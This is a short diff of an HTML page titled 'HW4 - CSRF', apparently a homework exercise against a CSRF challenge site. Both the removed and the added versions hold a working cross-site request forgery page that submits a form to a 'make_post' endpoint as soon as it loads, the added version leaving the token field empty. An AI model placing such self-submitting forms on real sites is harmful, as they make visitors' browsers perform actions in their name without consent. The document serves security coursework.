@@ -10,13 +10,14 @@
 	<title>HW4 - CSRF</title>
 <!-- 	<script src=code.jquery etc.> </script> -->
 </head>
-<body onload="document.csrfForm.submit()">
-	<h1>Hi</h1>
-	<form id="post_form" action="http://csrf-challenges.r7.io/make_post/1" method="GET" name="csrfForm">
-		<input type="hidden" name="csrf" value="royleTest">
-		<textarea name="post" value="royleTest">royleTest</textarea>
+<body>
+	<form id="post_form" action="http://csrf-challenges.r7.io/make_post/1" method="GET" >
+		<input type="hidden" name="csrf" value="">
+		<textarea name="post" value="royle">royle</textarea>
 		<input type="submit" value="submit">
 	</form>
-	<iframe name="hiddenFrame" style="display: none;"></iframe>
+	<script>
+		document.getElementById("post_form").submit();
+	</script>
 </body>
 </html>
